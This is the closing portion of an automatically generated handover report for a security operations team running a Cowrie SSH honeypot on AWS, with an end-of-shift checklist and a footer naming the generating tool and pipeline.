- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-01T10:53:36Z_
